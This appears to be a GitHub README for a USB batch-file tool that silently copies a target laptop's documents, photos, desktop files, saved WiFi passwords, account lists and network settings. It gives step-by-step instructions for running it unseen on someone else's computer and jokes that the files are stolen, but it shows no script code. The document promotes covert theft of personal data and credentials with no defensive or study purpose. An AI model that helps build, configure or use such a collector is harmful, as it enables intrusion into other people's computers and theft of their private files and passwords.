# ANYX-Data-Collector
This is a Silent data collector... I claim no responsibilty of your actions... OK DOn't get in trouble


This is a light weight .bat file which basically silently copy the data in your USB 
🚀 HOW TO USE - STEP BY STEP
📦 Step 1: Setup the USB (Prepare Your Toolkit)
On YOUR computer (the one you control):
Insert a USB drive (any size - 8GB or larger recommended)

Download or clone this repository

git clone https://github.com/yourusername/usb-data-collector.git
Or download the ZIP file

Copy ALL files to USB root (not in a folder)
USB Drive (E:\)/
├── file.bat          ← Copy this
├── launch.bat        ← Copy this  
├── visible.vbs       ← Copy this
├── config.ini        ← Copy this
└── README.md         ← Optional
(Optional) Edit config.ini to customize what you want to steal... I mean collect
Open config.ini in Notepad
Add/remove folders you want to copy
Save the file
Safely eject the USB



🎯 Step 2: Use on Target Laptop
On the TARGET computer (the one you want to collect data from):
Insert the USB into the target laptop
Open File Explorer (Windows + E)
Navigate to the USB drive (usually D:\ or E:)
Double-click launch.bat

Now what will happen next it will basically silently copy things to your USB
WHAT HAPPENS NEXT:
If config says	What you see	What actually happens
SHOW_PROGRESS = NO	NOTHING - No windows, no popups, no CMD	Files are copying silently in background
SHOW_PROGRESS = YES	A black CMD window shows copying progress	Files copy while you watch
Wait 10-60 seconds (depending on how much data)
Safely remove the USB (or just pull it out if you're brave)


📂 Step 3: Check the Results
Back on YOUR computer:
Insert the USB back into your computer

Look for a folder named:

text
CollectedData_20260526_143022/
(The numbers are date and time)

Open it and see what was collected:

text
CollectedData_20260526_143022/
├── 📄 collection_log.txt     ← See everything that happened
├── 📄 success.txt            ← What copied successfully
├── 📄 errors.txt             ← What failed (if anything)
├── 📁 Documents/             ← Their documents
├── 📁 Pictures/              ← Their pictures
├── 📁 Desktop/               ← Their desktop files
├── 📁 WiFi_Profiles/         ← Their saved WiFi passwords
├── 📄 System_Info.txt        ← Computer name, OS, etc.
├── 📄 User_Accounts.txt      ← All user accounts
└── 📄 Network_Config.txt     ← IP address, DNS, etc.

DO it and don't get in trouble... 
